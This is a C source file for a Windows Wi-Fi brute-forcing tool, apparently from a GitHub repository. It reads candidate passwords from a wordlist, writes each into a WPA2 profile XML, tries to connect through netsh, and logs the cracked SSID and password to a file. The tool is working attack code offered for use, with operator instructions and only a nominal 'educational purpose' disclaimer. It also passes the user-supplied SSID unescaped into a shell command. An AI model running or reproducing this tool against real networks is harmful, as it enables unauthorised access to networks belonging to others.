#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>  // For Sleep() function

//C Wi-Fi Brute Forcer - Developed By bhailife
//Please refer to https://github.com/bhailife for more projects

//This program is created to be a proof of concept that it is possible
// to write a working Wi-Fi attack tool with C since there 
// are countless examples on the internet that claims to be legit
// hacking tools, working on CMD. While this tool does not claim
// a 100% success ratio, it still works if the target Wi-Fi has
// weak password. :)

// There is already a password file in the repository but you are
// free to use your own wordlists.

#define MAX_PASSWORD_LENGTH 100

int main() {
    char id[40];
    FILE *passwordFile;
    char password[MAX_PASSWORD_LENGTH];
    
    // Open the password file
    passwordFile = fopen("password.txt", "r");
    if (passwordFile == NULL) {
        perror("Error opening password file");
        return 1;
    }
//for result
    FILE *result1 = fopen("result.txt", "a"); // Open file in write mode
    if(result1 ==NULL){
        printf("Error opening file!\n");
        return 1;
    }

    printf("------------------------------C wifi bruteforcer-------------------------------\n");

    printf("Created by:  Bhai Life\n");
    printf("1) Run it as an Administrator\n");
    printf("2) The program will close once he found a correct password\n");
    printf("3) Reopen the program if it's not showing the network  \n");
    printf("4) Ctrl+C Copy  Ctrl+V Paste\n");
    printf("5) Password will be saved in result.txt\n");
    printf("6) This code is just for educational purpose only \n");
    
    printf("NOTE: Make sure you Entered Correct ssid the program will not check it \n");
    

    printf("------------------------------Interfaces-------------------------------\n");
    system("netsh wlan show interfaces | findstr /C:\"Description\" /C:\"Physical address\"");
    printf("------------------------------Avaliable Networks-------------------------------\n");
    system("netsh wlan show networks | findstr \"SSID\"");
    
    printf("Enter SSID: ");
    fgets(id, sizeof(id), stdin);
    id[strcspn(id, "\n")] = 0;  // Remove the newline character

    // Loop through all passwords in the password file
    while (fgets(password, sizeof(password), passwordFile)) {
        // Remove the newline character from the password
        password[strcspn(password, "\n")] = 0;

        // Create Wi-Fi profile XML file with the current password
        FILE *file = fopen("wifi_profile.xml", "w");
        if (file == NULL) {
            perror("Error creating file");
            return 1;
        }
        fprintf(file, 
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n"
            "    <name>%s</name>\n"
            "    <SSIDConfig>\n"
            "        <SSID>\n"
            "            <name>%s</name>\n"
            "        </SSID>\n"
            "    </SSIDConfig>\n"
            "    <connectionType>ESS</connectionType>\n"
            "    <connectionMode>manual</connectionMode>\n"
            "    <MSM>\n"
            "        <security>\n"
            "            <authEncryption>\n"
            "                <authentication>WPA2PSK</authentication>\n"
            "                <encryption>AES</encryption>\n"
            "                <useOneX>false</useOneX>\n"
            "            </authEncryption>\n"
            "            <sharedKey>\n"
            "                <keyType>passPhrase</keyType>\n"
            "                <protected>false</protected>\n"
            "                <keyMaterial>%s</keyMaterial>\n"
            "            </sharedKey>\n"
            "        </security>\n"
            "    </MSM>\n"
            "</WLANProfile>\n", id, id, password);
        fclose(file);

        // Add Wi-Fi profile
        int result = system("netsh wlan add profile filename=\"wifi_profile.xml\" user=all");
        if (result != 0) {
            printf("Failed to add Wi-Fi profile. Run as administrator?\n");
            return 1;
        }

        // Connect to the Wi-Fi network
        char connectCmd[100];
        snprintf(connectCmd, sizeof(connectCmd), "netsh wlan connect name=\"%s\"", id);
        system(connectCmd);
        Sleep(1000);  // Wait for the connection to establish

        // Check Wi-Fi connection status
        if (system("netsh wlan show interface | findstr \"State\" | findstr \"connected\"") == 0) {
            printf("Connected with password: %s\n", password);
            fprintf(result1, "%s:\t", id); // Write to file
            fprintf(result1, "%s\n", password); // Write to file
            break;  // Exit the loop if connected successfully
        } else {
            printf("Failed with password: %s\n", password);
        }
    }

    fclose(passwordFile);   // Close the password file
    fclose(result1);
    return 0;
}
